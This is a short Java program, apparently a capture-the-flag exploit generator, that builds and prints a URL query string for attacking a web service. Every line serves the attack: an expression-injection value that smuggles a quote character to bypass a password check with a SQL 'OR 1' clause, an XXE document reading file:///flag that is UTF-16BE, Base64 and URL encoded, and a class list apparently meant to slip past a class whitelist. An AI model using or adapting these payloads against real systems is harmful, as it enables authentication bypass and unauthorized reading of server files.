/**
 * @author zeroc
 * @date 2022/12/26 20:36
 */
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.Base64;

public class exp {
    public static void main(String[] args) throws Exception{
        String original = "${@java.lang.Character@toString(39)}) OR 1#";
        String encodedpasswd = URLEncoder.encode(original, "UTF-8");
        String poc = "<?xml version=\"1.0\"?><!DOCTYPE ANY [<!ENTITY xxe SYSTEM \"file:///flag\">]><a>&xxe;</a>";
        byte[] pocBytes = poc.getBytes(StandardCharsets.UTF_16BE);
        String encodedPoc = URLEncoder.encode(Base64.getEncoder().encodeToString(pocBytes), "UTF-8");
        String type = URLEncoder.encode("zeroc", "UTF-8");
        String yourclasses = URLEncoder.encode("java.io.ByteArrayInputStream,[B,org.xml.sax.InputSource,java.io.InputStream", "UTF-8");
        String payload = "?password=" + encodedpasswd + "&poc=" + encodedPoc + "&type=" + type + "&yourclasses=" + yourclasses;
        System.out.println(payload);
    }
}